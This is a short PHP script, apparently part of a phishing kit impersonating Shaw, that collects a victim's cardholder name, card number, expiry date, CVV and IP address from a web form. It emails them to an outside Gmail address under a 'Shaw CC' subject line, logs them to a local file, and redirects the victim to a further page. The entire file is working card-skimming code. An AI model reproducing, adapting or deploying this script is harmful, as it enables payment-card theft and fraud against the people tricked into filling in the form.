<?php
$required = array('cardn');

$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  echo '404';
} else {
session_start();

$ip = getenv("REMOTE_ADDR");

$msg = "

NAME : ".$_POST['nameoncard']."
CC : ".$_POST['cardn']."
EXP : ".$_POST['cardex']."
CSC : ".$_POST['cardcvv']."
IP : $ip
==================================";

$send = "dosta@gmail.com";
$subj = "♥ Shaw CC ♥ - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail($send, $subj, $msg, $headers);


$fp=fopen('sub.txt','a'); 
fwrite($fp,addslashes($msg). "\r\n"); 
fclose($fp); 
header("Location: info.php");
exit();
}
?>